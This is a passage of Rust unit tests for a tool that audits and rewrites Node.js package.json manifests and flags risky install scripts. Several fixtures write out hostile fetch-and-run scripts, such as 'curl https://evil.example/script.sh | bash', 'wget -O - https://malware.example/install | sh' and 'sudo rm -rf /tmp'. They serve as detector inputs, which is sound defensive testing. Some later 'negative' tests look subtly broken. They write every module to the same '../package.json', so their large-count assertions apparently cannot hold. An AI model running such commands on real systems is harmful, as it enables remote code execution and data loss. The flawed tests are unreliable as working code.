    }

    #[test]
    fn run_rewrite_apply_is_idempotent_after_first_engine_pin() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "index.js", "console.log('hello');");
        write_project_file(
            project,
            "package.json",
            r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        );

        let first = run_rewrite(project, true).expect("first rewrite");
        let after_first =
            std::fs::read_to_string(project.join("package.json")).expect("read rewritten package");
        let second = run_rewrite(project, true).expect("second rewrite");
        let after_second =
            std::fs::read_to_string(project.join("package.json")).expect("read package again");

        assert_eq!(first.rewrites_planned, 1);
        assert_eq!(first.rewrites_applied, 1);
        assert_eq!(first.rollback_entries.len(), 1);
        assert_eq!(second.rewrites_planned, 0);
        assert_eq!(second.rewrites_applied, 0);
        assert!(second.rollback_entries.is_empty());
        assert_eq!(after_second, after_first);
    }

    #[test]
    fn run_rewrite_dry_run_is_idempotent_and_does_not_mutate_manifest() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();
        let original = r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#;

        write_project_file(project, "package.json", original);

        let first = run_rewrite(project, false).expect("first dry run");
        let after_first =
            std::fs::read_to_string(project.join("package.json")).expect("read package");
        let second = run_rewrite(project, false).expect("second dry run");
        let after_second =
            std::fs::read_to_string(project.join("package.json")).expect("read package again");

        assert_eq!(first.rewrites_planned, 1);
        assert_eq!(first.rewrites_applied, 0);
        assert_eq!(second.rewrites_planned, 1);
        assert_eq!(second.rewrites_applied, 0);
        assert_eq!(after_first, original);
        assert_eq!(after_second, original);
        assert_eq!(
            first.rollback_entries[0].rewritten_content,
            second.rollback_entries[0].rewritten_content
        );
    }

    #[test]
    fn run_rewrite_preserves_existing_node_engine_without_rollback_entry() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();
        let original = r#"{
          "name":"demo",
          "version":"1.0.0",
          "engines":{"node":"22.x"},
          "scripts":{"test":"node test.js"}
        }"#;

        write_project_file(project, "package.json", original);

        let report = run_rewrite(project, true).expect("rewrite no-op");
        let after = std::fs::read_to_string(project.join("package.json")).expect("read package");

        assert_eq!(report.rewrites_planned, 0);
        assert_eq!(report.rewrites_applied, 0);
        assert!(report.rollback_entries.is_empty());
        assert_eq!(after, original);
    }

    #[test]
    fn build_rollback_plan_emits_serializable_original_and_rewritten_manifest() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();
        let original = r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#;

        write_project_file(project, "package.json", original);

        let report = run_rewrite(project, false).expect("dry-run rewrite");
        let plan = build_rollback_plan(&report);
        let serialized = serde_json::to_value(&plan).expect("rollback plan serializes");

        assert_eq!(plan.schema_version, "1.0.0");
        assert!(!plan.apply_mode);
        assert_eq!(plan.entry_count, 1);
        assert_eq!(plan.entries[0].path, "package.json");
        assert_eq!(plan.entries[0].original_content, original);
        assert!(plan.entries[0].rewritten_content.contains("\"engines\""));
        assert!(
            plan.entries[0]
                .rewritten_content
                .contains("\"node\": \">=20 <23\"")
        );
        assert_eq!(serialized["schema_version"], "1.0.0");
        assert_eq!(serialized["apply_mode"], serde_json::Value::Bool(false));
        assert_eq!(serialized["entry_count"].as_u64(), Some(1));
    }

    #[test]
    fn build_rollback_plan_records_multiple_manifest_entries_in_path_order() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(
            project,
            "package.json",
            r#"{"name":"root","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        );
        write_project_file(
            project,
            "packages/app/package.json",
            r#"{"name":"app","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        );

        let report = run_rewrite(project, false).expect("dry-run rewrite");
        let plan = build_rollback_plan(&report);
        let paths = plan
            .entries
            .iter()
            .map(|entry| entry.path.as_str())
            .collect::<Vec<_>>();

        assert_eq!(plan.entry_count, 2);
        assert_eq!(paths, vec!["package.json", "packages/app/package.json"]);
        assert!(plan.entries.iter().all(|entry| {
            entry.original_content.contains("\"scripts\"")
                && entry.rewritten_content.contains("\"node\": \">=20 <23\"")
        }));
    }

    #[test]
    fn build_rollback_plan_for_noop_rewrite_emits_empty_artifact() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_hardened_manifest(project);

        let report = run_rewrite(project, false).expect("dry-run rewrite");
        let plan = build_rollback_plan(&report);

        assert_eq!(report.package_manifests_scanned, 1);
        assert_eq!(report.rewrites_planned, 0);
        assert_eq!(plan.entry_count, 0);
        assert!(plan.entries.is_empty());
    }

    #[test]
    fn run_rewrite_can_apply_node_engine_pin() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        )
        .expect("write package");

        let dry_run = run_rewrite(project, false).expect("dry-run rewrite");
        assert_eq!(dry_run.rewrites_planned, 1);
        assert_eq!(dry_run.rewrites_applied, 0);
        assert_eq!(dry_run.rollback_entries.len(), 1);
        assert!(
            dry_run
                .entries
                .iter()
                .any(|entry| entry.action == MigrationRewriteAction::PinNodeEngine)
        );

        let applied = run_rewrite(project, true).expect("applied rewrite");
        assert_eq!(applied.rewrites_planned, 1);
        assert_eq!(applied.rewrites_applied, 1);

        let rewritten =
            std::fs::read_to_string(project.join("package.json")).expect("read rewritten package");
        let parsed: serde_json::Value = serde_json::from_str(&rewritten).expect("valid json");
        assert_eq!(
            parsed
                .get("engines")
                .and_then(serde_json::Value::as_object)
                .and_then(|engines| engines.get("node"))
                .and_then(serde_json::Value::as_str),
            Some(">=20 <23")
        );
    }

    #[test]
    fn run_rewrite_reports_risky_script_manual_review() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
            }"#,
        )
        .expect("write package");

        let report = run_rewrite(project, false).expect("rewrite report");
        assert!(
            report
                .entries
                .iter()
                .any(|entry| entry.action == MigrationRewriteAction::ManualScriptReview)
        );
        assert!(report.manual_review_items >= 1);
    }

    #[test]
    fn run_audit_classifies_missing_node_engine_under_runtime() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        )
        .expect("write package");
        std::fs::write(project.join("package-lock.json"), "{}\n").expect("write lockfile");

        let report = run_audit(project).expect("audit should succeed");
        let finding = report
            .findings
            .iter()
            .find(|finding| {
                finding.path.as_deref() == Some("package.json")
                    && finding.message.contains("missing engines.node")
            })
            .expect("missing engines finding");

        assert_eq!(finding.category, MigrationCategory::Runtime);
        assert_eq!(finding.severity, MigrationSeverity::Low);
    }

    #[test]
    fn collect_risky_script_names_returns_sorted_owned_names() {
        let manifest = serde_json::json!({
            "scripts": {
                "build": "tsc -p tsconfig.json",
                "postinstall": "curl https://example.invalid/install.sh | bash",
                "install": "node-gyp rebuild"
            }
        });

        let risky = collect_risky_script_names(&manifest);

        assert_eq!(
            risky,
            vec!["install".to_string(), "postinstall".to_string()]
        );
    }

    #[test]
    fn run_validate_fails_without_lockfile_and_with_risky_scripts() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
            }"#,
        )
        .expect("write package");

        let report = run_validate(project).expect("validate report");
        assert!(!report.is_pass());
        assert!(
            report
                .checks
                .iter()
                .any(|check| check.id == "mig-validate-002" && !check.passed)
        );
        assert!(
            report
                .checks
                .iter()
                .any(|check| check.id == "mig-validate-003" && !check.passed)
        );
    }

    #[test]
    fn run_validate_passes_for_hardened_project() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "engines":{"node":">=20 <23"},
              "scripts":{"test":"node test.js"}
            }"#,
        )
        .expect("write package");
        std::fs::write(project.join("package-lock.json"), "{}\n").expect("write lockfile");

        let report = run_validate(project).expect("validate report");
        assert!(report.is_pass());
        assert!(report.blocking_findings.is_empty());
        assert!(report.checks.iter().all(|check| check.passed));
    }

    #[test]
    fn run_validate_surfaces_lockstep_warning_for_js_only_project() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "index.js", "console.log('hello');");
        write_hardened_manifest(project);
        write_lockfile(project);

        let report = run_validate(project).expect("validate report");

        assert!(report.is_pass());
        assert!(report.blocking_findings.is_empty());
        assert!(report.warning_findings.iter().any(|finding| {
            finding.category == MigrationCategory::Runtime
                && finding
                    .message
                    .contains("JavaScript files and no TypeScript files")
                && finding
                    .recommendation
                    .as_deref()
                    .is_some_and(|text| text.contains("lockstep validation coverage"))
        }));
    }

    #[test]
    fn run_validate_does_not_emit_lockstep_warning_when_typescript_is_present() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "index.js", "console.log('hello');");
        write_project_file(project, "index.ts", "export const answer: number = 42;");
        write_hardened_manifest(project);
        write_lockfile(project);

        let report = run_validate(project).expect("validate report");
        let has_lockstep_warning = report.warning_findings.iter().any(|finding| {
            finding
                .recommendation
                .as_deref()
                .is_some_and(|text| text.contains("lockstep validation coverage"))
        });

        assert!(report.is_pass());
        assert!(!has_lockstep_warning);
    }

    #[test]
    fn run_validate_lockstep_gate_blocks_invalid_manifest_json() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "index.ts", "export const answer = 42;");
        write_project_file(project, "package.json", r#"{"name":"demo","#);
        write_lockfile(project);

        let report = run_validate(project).expect("validate report");

        assert!(!report.is_pass());
        assert!(report.checks.iter().any(|check| {
            check.id == "mig-validate-004"
                && !check.passed
                && check.message == "high-severity audit findings: 1"
        }));
        assert!(report.blocking_findings.iter().any(|finding| {
            finding.category == MigrationCategory::Project
                && finding.message.contains("invalid package.json JSON")
        }));
    }

    #[test]
    fn run_validate_lockstep_gate_blocks_missing_manifest_even_with_lockfile() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "index.ts", "export const answer = 42;");
        write_lockfile(project);

        let report = run_validate(project).expect("validate report");

        assert!(!report.is_pass());
        assert!(report.checks.iter().any(|check| {
            check.id == "mig-validate-001"
                && !check.passed
                && check.message == "package manifests detected: 0"
        }));
        assert!(report.checks.iter().any(|check| {
            check.id == "mig-validate-004"
                && !check.passed
                && check.message == "high-severity audit findings: 1"
        }));
        assert!(report.blocking_findings.iter().any(|finding| {
            finding.category == MigrationCategory::Project
                && finding.message.contains("no package.json files found")
        }));
    }

    #[test]
    fn parse_audit_output_format_rejects_blank_value() {
        let err = AuditOutputFormat::parse(" \t\n ")
            .expect_err("blank audit output format must fail closed");

        assert!(err.contains("unsupported migrate audit format"));
        assert!(err.contains("json, text, sarif"));
    }

    #[test]
    fn parse_audit_output_format_rejects_shell_like_value() {
        let err = AuditOutputFormat::parse("json;unexpected")
            .expect_err("shell-like audit format must not be normalized");

        assert!(err.contains("json;unexpected"));
        assert!(err.contains("expected one of"));
    }

    #[test]
    fn parse_audit_output_format_rejects_path_like_suffix() {
        let err = AuditOutputFormat::parse("sarif.json")
            .expect_err("path-like audit format suffix must be rejected");

        assert!(err.contains("sarif.json"));
    }

    #[test]
    fn ensure_node_engine_pin_rejects_non_object_manifest() {
        let mut manifest = serde_json::json!(["not", "an", "object"]);

        assert!(!ensure_node_engine_pin(&mut manifest));
        assert_eq!(manifest, serde_json::json!(["not", "an", "object"]));
    }

    #[test]
    fn ensure_node_engine_pin_rejects_non_object_engines_field() {
        let mut manifest = serde_json::json!({
            "name": "demo",
            "engines": "node >=20",
        });

        assert!(!ensure_node_engine_pin(&mut manifest));
        assert_eq!(manifest["engines"], "node >=20");
        assert!(manifest.get("node").is_none());
    }

    #[test]
    fn collect_risky_script_names_ignores_non_string_commands() {
        let manifest = serde_json::json!({
            "scripts": {
                "postinstall": ["curl https://example.invalid/install.sh"],
                "install": {"cmd": "node-gyp rebuild"},
                "prepare": null,
            }
        });

        let risky = collect_risky_script_names(&manifest);

        assert!(risky.is_empty());
    }

    #[test]
    fn collect_risky_script_names_ignores_non_object_scripts_field() {
        let manifest = serde_json::json!({
            "scripts": "postinstall=curl https://example.invalid/install.sh",
        });

        let risky = collect_risky_script_names(&manifest);

        assert!(risky.is_empty());
    }

    #[test]
    fn is_risky_script_does_not_flag_near_miss_tokens() {
        assert!(!is_risky_script("build", "echo curling artifacts"));
        assert!(!is_risky_script("build", "echo wgettable cache"));
        assert!(!is_risky_script("build", "node scripts/install.js"));
    }

    #[test]
    fn run_audit_rejects_file_target_path() {
        let temp = tempfile::tempdir().expect("tempdir");
        let file_path = temp.path().join("package.json");
        std::fs::write(&file_path, "{}\n").expect("write file target");

        let err = run_audit(&file_path).expect_err("file target must not be audited as project");

        assert!(err.to_string().contains("target must be a directory"));
    }

    #[test]
    fn run_rewrite_rejects_missing_target_path() {
        let temp = tempfile::tempdir().expect("tempdir");
        let missing_path = temp.path().join("missing-project");

        let err = run_rewrite(&missing_path, false)
            .expect_err("missing rewrite target must fail before scanning");

        assert!(err.to_string().contains("target does not exist"));
    }

    #[test]
    fn negative_collect_project_files_with_unbounded_vec_push() {
        // Test potential memory exhaustion from unlimited Vec::push operations
        // Lines 616, 617, 638, 640 use Vec::push without push_bounded bounds checking
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        // Create a deeply nested directory structure that could stress Vec operations
        let mut deep_path = project.to_path_buf();
        for i in 0..100 {
            deep_path = deep_path.join(format!("level-{:03}", i));
            std::fs::create_dir_all(&deep_path).expect("create deep dirs");

            // Add multiple files at each level to stress the files Vec
            for j in 0..10 {
                std::fs::write(deep_path.join(format!("file-{:03}.js", j)), "console.log('test');")
                    .expect("write deep file");
                std::fs::write(deep_path.join(format!("file-{:03}.json", j)), "{}")
                    .expect("write deep json");
            }
        }

        // This should succeed but demonstrates unlimited Vec growth potential
        let files = collect_project_files(project).expect("collect files");

        // Verify files were collected (demonstrating the Vec growth)
        assert!(files.len() > 1000, "Should collect many files from deep structure");

        // All files should be valid paths
        for file_path in &files {
            assert!(file_path.exists(), "Collected path should exist");
            assert!(file_path.is_file(), "Collected path should be a file");
        }

        // The current implementation has no bounds on Vec::push operations
        // A hardened version might use push_bounded with MAX_FILES_PER_PROJECT
        // or implement early termination for excessively large projects
    }

    #[test]
    fn negative_migration_entry_id_generation_with_integer_overflow() {
        // Test ID generation arithmetic that could overflow
        // Line 412: format!("mig-rewrite-{:03}", index + 1) uses direct addition
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        // Create a project that will generate many rewrite entries
        write_project_file(project, "package.json", r#"{
            "name": "overflow-test",
            "version": "1.0.0"
        }"#);

        // This will generate at least one entry (missing node engine + no package manifests)
        let report = run_rewrite(project, false).expect("rewrite should succeed");

        // Verify entry IDs are generated correctly
        for (expected_index, entry) in report.entries.iter().enumerate() {
            let expected_id = format!("mig-rewrite-{:03}", expected_index + 1);
            assert_eq!(entry.id, expected_id, "Entry ID should match expected format");
        }

        // Test the edge case where arithmetic could theoretically overflow
        // If we had usize::MAX entries, index + 1 would overflow
        // The current implementation doesn't protect against this scenario

        // Simulate what would happen with high index values
        for test_index in [usize::MAX - 10, usize::MAX - 1] {
            // This would overflow if actually called with these values
            // format!("mig-rewrite-{:03}", test_index + 1) would panic on overflow

            // In a hardened implementation, this should use saturating_add:
            // let safe_id = test_index.saturating_add(1);

            // We can't actually test the overflow without causing a panic,
            // but this demonstrates the vulnerability
            if test_index < usize::MAX {
                let safe_id_demo = format!("mig-rewrite-{:03}", test_index.saturating_add(1));
                assert!(safe_id_demo.len() > 10, "Safe ID generation should work");
            }
        }
    }

    #[test]
    fn negative_findings_vector_growth_without_push_bounded() {
        // Test unlimited findings growth through Vec::push operations
        // Lines 682, 700, 774 use findings.push() without bounds checking
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        // Create many problematic package.json files to stress findings collection
        for i in 0..200 {
            let dir_path = project.join(format!("module-{:03}", i));
            std::fs::create_dir_all(&dir_path).expect("create module dir");

            // Each manifest will generate multiple findings:
            // 1. Missing node engine (Low severity)
            // 2. Risky script (High severity)
            // 3. Invalid JSON (High severity) for some files
            if i % 3 == 0 {
                // Invalid JSON to trigger parse errors
                write_project_file(&dir_path, "../package.json", r#"{
                    "name": "invalid-module-INVALID_JSON
                "#);
            } else {
                // Valid JSON but with risky script and missing engine
                write_project_file(&dir_path, "../package.json", &format!(r#"{{
                    "name": "module-{}",
                    "version": "1.0.0",
                    "scripts": {{
                        "postinstall": "curl https://evil.example/script.sh | bash",
                        "preinstall": "wget -O - https://malware.example/install | sh",
                        "install": "sudo rm -rf /tmp && node-gyp rebuild"
                    }}
                }}"#, i));
            }
        }

        let report = run_audit(project).expect("audit should succeed");

        // Verify findings were collected (demonstrating Vec growth without bounds)
        assert!(report.findings.len() > 100, "Should generate many findings");

        // Each package.json should have contributed findings
        let high_severity_count = report.findings.iter()
            .filter(|f| matches!(f.severity, MigrationSeverity::High))
            .count();
        let low_severity_count = report.findings.iter()
            .filter(|f| matches!(f.severity, MigrationSeverity::Low))
            .count();

        assert!(high_severity_count > 50, "Should have many high-severity findings");
        assert!(low_severity_count > 50, "Should have many low-severity findings");

        // The current implementation has no protection against findings explosion
        // A hardened version might use push_bounded with MAX_FINDINGS_TOTAL
        // or implement per-category limits more strictly
    }

    #[test]
    fn negative_script_finding_boundary_check_with_off_by_one_potential() {
        // Test boundary condition in push_capped_script_finding
        // Line 754: count > MAX_FINDINGS_PER_CATEGORY - test boundary behavior
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        // Create exactly MAX_FINDINGS_PER_CATEGORY + 1 risky scripts
        let mut scripts_obj = serde_json::Map::new();
        for i in 0..=MAX_FINDINGS_PER_CATEGORY {
            scripts_obj.insert(
                format!("risky-script-{:03}", i),
                serde_json::Value::String("curl https://evil.example/script.sh | bash".to_string())
            );
        }

        let manifest = serde_json::json!({
            "name": "boundary-test",
            "version": "1.0.0",
            "scripts": scripts_obj
        });

        write_project_file(project, "package.json", &serde_json::to_string_pretty(&manifest).unwrap());

        let report = run_audit(project).expect("audit should succeed");

        // Count script-related findings
        let script_findings = report.findings.iter()
            .filter(|f| matches!(f.category, MigrationCategory::Scripts))
            .count();

        // Should be capped at MAX_FINDINGS_PER_CATEGORY
        assert_eq!(script_findings, MAX_FINDINGS_PER_CATEGORY,
                   "Script findings should be capped at MAX_FINDINGS_PER_CATEGORY");

        // Verify the boundary check works correctly with > comparison
        assert!(MAX_FINDINGS_PER_CATEGORY + 1 > MAX_FINDINGS_PER_CATEGORY,
                "Boundary check should use > not >= for correct capping");

        // Test with exactly MAX_FINDINGS_PER_CATEGORY scripts (should all be included)
        let temp2 = tempfile::tempdir().expect("tempdir2");
        let project2 = temp2.path();

        let mut exact_scripts_obj = serde_json::Map::new();
        for i in 0..MAX_FINDINGS_PER_CATEGORY {
            exact_scripts_obj.insert(
                format!("risky-script-{:03}", i),
                serde_json::Value::String("curl https://evil.example/script.sh | bash".to_string())
            );
        }

        let exact_manifest = serde_json::json!({
            "name": "exact-boundary-test",
            "version": "1.0.0",
            "scripts": exact_scripts_obj
        });

        write_project_file(project2, "package.json", &serde_json::to_string_pretty(&exact_manifest).unwrap());

        let exact_report = run_audit(project2).expect("audit should succeed");
        let exact_script_findings = exact_report.findings.iter()
            .filter(|f| matches!(f.category, MigrationCategory::Scripts))
            .count();

        // All MAX_FINDINGS_PER_CATEGORY scripts should be reported
        assert_eq!(exact_script_findings, MAX_FINDINGS_PER_CATEGORY,
                   "Exactly MAX_FINDINGS_PER_CATEGORY scripts should all be reported");
    }

    #[test]
    fn negative_rollback_entry_count_length_casting_vulnerability() {
        // Test potential unsafe length casting in rollback entry counting
        // Line 436: report.rollback_entries.len() could be cast unsafely elsewhere
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        // Create many package.json files that need rewriting
        for i in 0..1000 {
            let module_dir = project.join(format!("module-{:04}", i));
            std::fs::create_dir_all(&module_dir).expect("create module dir");

            // Package without node engine - will need rewriting
            write_project_file(&module_dir, "../package.json", &format!(r#"{{
                "name": "module-{}",
                "version": "1.0.0",
                "description": "Test module without node engine pin"
            }}"#, i));
        }

        let report = run_rewrite(project, false).expect("rewrite should succeed");
        let rollback_plan = build_rollback_plan(&report);

        // Verify high entry count
        assert!(rollback_plan.entry_count > 500, "Should have many rollback entries");
        assert_eq!(rollback_plan.entry_count, rollback_plan.entries.len(),
                   "Entry count should match entries vector length");

        // Test potential casting issues
        let entry_count_as_u32 = rollback_plan.entry_count as u32;
        assert_eq!(entry_count_as_u32 as usize, rollback_plan.entry_count,
                   "Casting to u32 and back should preserve value for reasonable counts");

        // Test with usize values that would overflow u32
        if rollback_plan.entry_count < u32::MAX as usize {
            // Safe cast
            let safe_u32 = u32::try_from(rollback_plan.entry_count)
                .expect("Should convert safely when within u32 range");
            assert_eq!(safe_u32 as usize, rollback_plan.entry_count);
        }

        // Demonstrate the vulnerability pattern:
        // let unsafe_cast = rollback_plan.entry_count as u32; // Could overflow
        // Better: let safe_cast = u32::try_from(rollback_plan.entry_count).unwrap_or(u32::MAX);

        let safe_cast_demo = u32::try_from(rollback_plan.entry_count).unwrap_or(u32::MAX);
        assert!(safe_cast_demo > 0, "Safe cast should preserve non-zero values");
    }
}
